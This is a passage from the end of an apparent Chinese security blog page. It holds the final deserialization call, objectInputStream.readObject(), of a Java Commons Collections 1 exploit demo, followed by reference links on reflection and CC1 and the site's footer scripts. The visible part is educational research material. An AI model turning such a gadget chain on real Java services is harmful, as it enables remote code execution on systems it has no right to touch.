objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><p>反射</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8621">https://xz.aliyun.com/news/8621</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6625#toc-0">https://xz.aliyun.com/news/6625#toc-0</a></li>
</ul>
</li>
<li><p>CC1</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_49047967/article/details/134763883">https://blog.csdn.net/weixin_49047967/article/details/134763883</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12115">https://xz.aliyun.com/news/12115</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/410767.html">https://www.freebuf.com/articles/web/410767.html</a></li>
<li>视频：<ul>
<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1A1421q7zj/?spm_id_from=333.337.search-card.all.click&vd_source=1602c1287f78f4bb7a0ff844ebc8dc41">https://www.bilibili.com/video/BV1A1421q7zj/?spm_id_from=333.337.search-card.all.click&amp;vd_source=1602c1287f78f4bb7a0ff844ebc8dc41</a></li>
<li><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&vd_source=1602c1287f78f4bb7a0ff844ebc8dc41">https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=1602c1287f78f4bb7a0ff844ebc8dc41</a></li>
</ul>
</li>
</ul>
</li>
</ul>

        </div>
        
            <div class="post-container">
            <aside class="toc-container">
                <button class="toc-toggle">文章目录</button>
                <nav class="toc" id="toc"></nav>
            </aside>
        </div>
        
    </div>


    <!-- 返回主页链接 -->
    <div class="text-center my-8">
        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">← Back to Home</a>
    </div>

      
      <script src="/js/toc.js"></script>  <!-- 引入 TOC 逻辑 -->
      
      

    <footer class="bg-black text-gray-400 py-4">
 <div class="container mx-auto text-center">
  <p>© <span id="current-year"></span>  向每个梦想加速 
    <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
 </div>
</footer>

<script> 
 document.getElementById("current-year").textContent = new Date().getFullYear();
</script>
<script>
window.MathJax = {
tex: {
  inlineMath: [['$', '$'], ['\\(', '\\)']]  // 启用 $...$ 和 \( ... \)
},
svg: {
  fontCache: 'global'
}
};
</script>
<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js" async></script>



</body>
</html>
